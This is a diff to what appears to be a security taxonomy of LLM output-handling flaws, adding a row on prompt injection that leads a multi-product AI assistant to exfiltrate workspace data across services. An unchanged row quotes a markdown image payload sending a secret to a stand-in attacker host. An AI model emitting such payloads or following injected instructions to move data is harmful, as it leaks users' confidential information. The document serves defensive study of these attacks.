@@ -269,6 +269,7 @@ When LLM outputs are consumed by downstream systems — rendered in browsers, ex
 | **File System Manipulation** | LLM output triggers file read/write/delete operations on the server through path traversal or command injection | Application allows LLM to specify file paths |
 | **Privilege Escalation via Output** | LLM generates administrative commands or elevated-privilege API calls that the downstream system executes | Downstream system trusts LLM output with elevated privileges |
 | **Data Exfiltration via Markdown/Image** | LLM generates markdown images with URLs containing sensitive data as query parameters (`![](https://evil.com?data=SECRET)`) — triggering browser fetch on render | Application renders markdown from LLM output |
+| **Cross-Product Workspace Exfiltration** | AI assistants with access to multiple products within a workspace (e.g., email, documents, calendar, drive) can be induced via prompt injection to read data from one product and exfiltrate it through another — such as summarizing confidential documents and embedding the summary in a shared calendar event, or exporting email contents via drive file creation. Markdown linkification in the AI's response triggers automatic browser fetches that transmit data cross-origin | Multi-product AI assistant with cross-service read/write permissions; markdown rendering of AI output (buganizer.cc "Hacking Gemini" research, 2025) |
 
 ### §7-3. Hallucination-Induced Vulnerabilities
 
